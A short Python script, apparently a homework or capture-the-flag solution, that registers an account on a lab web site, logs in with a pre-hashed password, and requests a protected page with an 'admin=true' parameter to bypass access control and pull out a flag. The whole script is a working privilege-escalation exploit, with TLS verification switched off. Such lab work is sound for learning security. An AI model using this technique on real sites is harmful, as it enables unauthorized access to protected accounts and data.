import requests
import hashlib
import re
reg_url = 'http://www.wsb.com/Homework3/case03/register.php'
login_url = 'http://www.wsb.com/Homework3/case03/includes/process_login.php'
protected_url = 'https://www.wsb.com/Homework3/case03/protected_page.php?admin=true'

username = 'test123456'
email = 'test123456@1.com'
password = 'Password123'

hashed_password = hashlib.sha512(password.encode('utf-8')).hexdigest()

reg_payload = {
    'username': username,
    'email': email,
    'password':'',
    'confirmpwd':'',
    'p': hashed_password # the hashed password field
}

reg_response = requests.post(reg_url, data=reg_payload)

payload = {
    'email': email,
    'password': '',
    'p': hashed_password  # the hashed password field
}

session = requests.Session()
session.verify = False
response = session.post(login_url, data=payload)
session_id = session.cookies.get('sec_session_id23')

if session_id:
    # make request to protected page with session ID included in cookie
    cookies = {'sec_session_id23': session_id}
    response = session.get(protected_url, cookies=cookies)
    #print(response.text)
else:
    print("Login failed.")


flag = re.search('The flag is ([a-zA-Z0-9]+)', response.text).group(1)

print('The flag is: ' + flag)
